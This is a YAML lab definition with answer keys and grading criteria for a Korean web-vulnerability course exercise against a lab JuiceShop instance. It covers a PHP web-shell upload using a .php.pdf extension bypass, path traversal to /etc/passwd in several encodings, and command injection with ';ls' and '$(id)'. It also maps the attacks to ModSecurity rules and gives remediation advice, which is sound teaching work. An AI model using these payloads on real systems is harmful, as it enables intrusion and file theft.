lab_id: standalone-web-vuln-week07
title: "입력값 검증 (3) — 파일 업로드 / 경로 순회 / 명령어 주입 (6v6 + R/B/P)"
version: standalone-non-ai
course: web-vuln
week: 7
description: |
  3 카테고리 — 파일 업로드 / 경로 순회 (path traversal) / 명령어 주입 (command
  injection) — 를 JuiceShop 의 endpoint 에서 시도. 각 카테고리 의 1 대표 payload
  + ModSec / 응답 패턴 분석 + Purple 의 방어 권고.
difficulty: medium
duration_minutes: 120
audience: 웹 보안 입문자 (7주차)
prerequisites:
  - "W03 정찰 으로 /ftp 디렉토리 + complaints 의 attachment 기능 식별 완료"
  - "W05 SQLi 의 경험 (payload encoding + 응답 분석)"
  - "attacker 에 curl / jq / dalfox / nuclei 가용"
objectives:
  - "파일 업로드 — JuiceShop 의 /api/Complaints attachment 에 .pdf 확장자 우회 시도"
  - "경로 순회 — /ftp 디렉토리 의 `../etc/passwd` 등 path traversal 시도"
  - "명령어 주입 — JuiceShop 의 검색 / api endpoint 에 shell metachar (; & |) 주입"
  - "3 카테고리 각각 의 ModSec CRS 룰 (930xxx PathTraversal / 932xxx OSCommand / 940xxx Generic) 매핑"
  - "Red/Blue/Purple — Red 의 payload burst 가 Wazuh dashboard 의 ModSec alert 로 가시화"
pass_threshold: 0.6
steps:

  - order: 1
    instruction: |
      ## 🎯 MISSION — 파일 업로드 의 endpoint 식별 + 1 회 시도

      **어디서:** attacker 컨테이너
      **무엇을:** JuiceShop 의 파일 업로드 가능한 endpoint 식별 (W03 정찰 결과 +
      /api-docs) 후 1 회 시도 (정상 PDF + 우회 시도 1 회).

      **결과 어떻게 정리:**

      | 시도 | 명령 (요약) | 응답 코드 | 응답 body 첫 1 줄 |
      |---|---|---|---|
      | 정상 PDF 업로드 | curl -X POST -F file=@x.pdf URL | | |
      | 확장자 우회 (.php.pdf) | | | |

      ## 💡 왜 이걸 하는가?

      파일 업로드 = 가장 위험한 결함 의 한 종류 (웹쉘 → RCE). 운영 환경 에서는
      MIME / 확장자 / magic byte 의 3 중 검증 + 업로드 디렉토리 의 실행 권한 제거.
      JuiceShop 의 검증 수준 확인.

      ## 🔵 Blue 관찰

      ModSecurity CRS 9xx 룰 가동. POST + multipart/form-data 응답 spike — Wazuh dashboard 에서 확인.

      ## 📋 채점 기준

      - 정상 + 우회 2 회 시도
      - 응답 코드 + body 1 줄 인용
      - 학생 본인 해석 1 문장 (성공/실패 + 사유)
    hint: "JuiceShop 의 /api/Complaints attachment 기능 — POST /api/Complaints with multipart. echo dummy > /tmp/x.pdf 로 빈 파일 생성."
    category: input_validation
    points: 12
    answer: |
      🤖 가이드:
      echo '%PDF-1.4 test' > /tmp/x.pdf
      curl -s -X POST http://juice.6v6.lab/api/Complaints \
        -F 'file=@/tmp/x.pdf;type=application/pdf' \
        -F 'message=test' -w '\nHTTP=%{http_code}\n' | head -c 200
      echo '<?php system($_GET[c]); ?>' > /tmp/x.php.pdf
      curl -s -X POST http://juice.6v6.lab/api/Complaints \
        -F 'file=@/tmp/x.php.pdf' \
        -F 'message=bypass test' -w '\nHTTP=%{http_code}\n' | head -c 200
    answer_detail: |
      JuiceShop 의 /api/Complaints 는 인증 필요 endpoint. 우회 시도 전 W04 의 JWT
      token 첨부 (`-H "Authorization: Bearer <token>"`). 확장자 검증 만 있으면 .php.pdf
      bypass. magic byte 까지 검증 하면 진짜 PDF 헤더 (%PDF-) 만 통과.
    verify:
      intent: "파일 업로드 endpoint 의 정상 + 우회 2 회 시도 + 결과 분석"
      success_criteria:
        - "2 회 시도 + 응답 코드"
        - "body 1 줄 인용"
        - "해석 1 문장"
      acceptable_methods:
        - "curl -F multipart 또는 -d 직접"
      negative_signs:
        - "1 회 만 시도"
        - "응답 인용 없음"
    target_vm: attacker
    risk_level: medium

  - order: 2
    instruction: |
      ## 🎯 MISSION — 경로 순회 (Path Traversal) — /ftp endpoint

      **어디서:** attacker
      **무엇을:** JuiceShop 의 /ftp 디렉토리 에 `..` 시퀀스 로 상위 파일 접근 시도.
      여러 인코딩 (`..`, `%2e%2e`, `..%2f`) 시도.

      **결과 정리:**

      | payload | URL | 응답 코드 | 응답 body 1 줄 |
      |---|---|---|---|
      | `/ftp/test.txt` (정상) | | | |
      | `/ftp/../etc/passwd` | | | |
      | `/ftp/%2e%2e/etc/passwd` | | | |
      | `/ftp/..%2fetc/passwd` | | | |

      ## 💡 왜?

      경로 순회 = 가장 흔한 LFI (Local File Inclusion) 패턴. 운영 환경 에서는
      Apache 의 default ../ 차단 + application-level 검증. 인코딩 우회 가능성.

      ## 🔵 Blue

      ModSecurity CRS 930100 (Path Traversal) 가동. 응답 400/403.

      ## 📋 채점

      - 4 payload 모두 시도 + 표
      - 어느 payload 통과 / 어느 차단
      - 학생 해석 1 문장
    hint: "curl 의 --path-as-is 옵션 필수 (curl 이 path 정규화 안 함). 또는 직접 raw HTTP request."
    category: input_validation
    points: 12
    answer: |
      🤖 가이드:
      for p in '/ftp/legal.md' '/ftp/../etc/passwd' '/ftp/%2e%2e/etc/passwd' '/ftp/..%2fetc/passwd'; do
        code=$(curl --path-as-is -o /tmp/r.out -s -w '%{http_code}' "http://juice.6v6.lab${p}")
        head=$(head -1 /tmp/r.out | head -c 60)
        echo "${p} → ${code} | ${head}"
      done
    answer_detail: |
      JuiceShop /ftp 는 의도적 directory listing — legal.md / acquisitions.md 등 정상 접근.
      `..` traversal 은 보통 ModSec 차단. URL encoding 우회 도 ModSec CRS 의 930xxx 룰 에서 캐치.
    verify:
      intent: "4 path traversal payload + 응답 표 + 차단 분석"
      success_criteria:
        - "4 payload 모두 시도"
        - "어느 payload 통과 / 차단"
        - "해석 1 문장"
      acceptable_methods:
        - "curl --path-as-is"
        - "다른 도구 (httpie raw) 도 OK"
      negative_signs:
        - "1~2 payload 만"
        - "응답 코드 없이 추상 설명"
    target_vm: attacker
    risk_level: medium

  - order: 3
    instruction: |
      ## 🎯 MISSION — 명령어 주입 (Command Injection) 시도

      **어디서:** attacker
      **무엇을:** JuiceShop 의 일부 endpoint 에 shell metachar (; & | $() ` `) 주입.
      JuiceShop 자체 가 Node.js Express 라 직접 RCE 어려움 — `child_process.exec`
      사용 여부 의 결함 식별.

      **결과 정리:**

      ```
      대상 endpoint: <선택 한 endpoint>
      payload 1: <학생 본인 payload>
      응답: <code + body>
      payload 2: ...
      학생 1 문장: JuiceShop 의 command injection 결함 유무 + 사유
      ```

      ## 💡 왜?

      command injection = 가장 치명적 결함 (RCE). 운영 환경 에서는 `exec` 사용 자체
      를 피하고 spawn 의 array form (`spawn('cmd', ['arg1'])`) 사용.

      ## 📋 채점

      - 2 endpoint 이상 시도
      - 응답 인용
      - 학생 1 문장
    hint: "JuiceShop 의 의도적 challenge: B2B endpoint 의 deluxe membership 또는 admin 의 일부 기능. 단순 endpoint 의 입력 에 `;ls`, `&&id`, `\\`whoami\\`` 등."
    category: input_validation
    points: 10
    answer: |
      🤖 가이드:
      curl -s -G 'http://juice.6v6.lab/rest/products/search' --data-urlencode 'q=apple;ls' -w '\nHTTP=%{http_code}\n' | head -c 200
      curl -s -G 'http://juice.6v6.lab/rest/products/search' --data-urlencode 'q=$(id)' -w '\nHTTP=%{http_code}\n' | head -c 200
    answer_detail: |
      JuiceShop 의 search 는 Sequelize ORM — `exec` 없이 SQL 만. command injection 결함 X (직접). 단 일부 file path 처리 endpoint 의 ssrf-cmd hybrid 가능성. 학습 가치 = "JS app 의 RCE 는 SQLi/SSRF 와 chain"
    verify:
      intent: "command injection 2 endpoint 시도 + 결함 유무 분석"
      success_criteria:
        - "2 endpoint 시도"
        - "응답 인용"
        - "해석 1 문장"
      acceptable_methods:
        - "curl 다양 endpoint"
      negative_signs:
        - "추상 설명 만"
        - "1 endpoint 만"
    target_vm: attacker
    risk_level: medium

  - order: 4
    instruction: |
      ## 🎯 MISSION — 3 카테고리 통합 finding 보고서 + cleanup

      **어디서:** 학생 PC 보고서 + attacker cleanup
      **무엇을:** STEP 1~3 의 3 finding 통합 markdown + /tmp cleanup.

      **보고서 구조:**

      ```markdown
      # W07 입력값 검증 (3) 점검 finding

      ## F-01 파일 업로드
      - 결함 유무: <yes/no/partial>
      - 증거: ...
      - 권고: MIME + 확장자 + magic byte 3 중 검증

      ## F-02 경로 순회
      - ...

      ## F-03 명령어 주입
      - ...

      ## 종합: 3 카테고리 중 운영 환경 에서 가장 우선 수정 권고 1 개 + 사유
      ```

      cleanup: `rm -f /tmp/x.pdf /tmp/x.php.pdf /tmp/r.out`

      ## 📋 채점

      - 3 finding 표 + 권고
      - cleanup + 확인
      - 종합 우선순위 1 개
    hint: "F-01/02/03 각 의 위험도 (CVSS) + 운영 환경 빈도 기준 우선순위."
    category: documentation
    points: 12
    answer: |
      🤖 가이드: markdown 3 finding + 종합 — 위 instruction example.
      rm -f /tmp/x.pdf /tmp/x.php.pdf /tmp/r.out 2>/dev/null
    answer_detail: |
      파일 업로드 = 직접 RCE → 우선순위 1. 경로 순회 = LFI → 2. command injection = JuiceShop 에 결함 X → 3.
    verify:
      intent: "3 finding 통합 + 우선순위 + cleanup"
      success_criteria:
        - "3 finding 모두 포함"
        - "우선순위 + 사유"
        - "cleanup 완료"
      acceptable_methods:
        - "markdown"
      negative_signs:
        - "1~2 finding 누락"
        - "우선순위 없음"
    target_vm: attacker
    risk_level: low
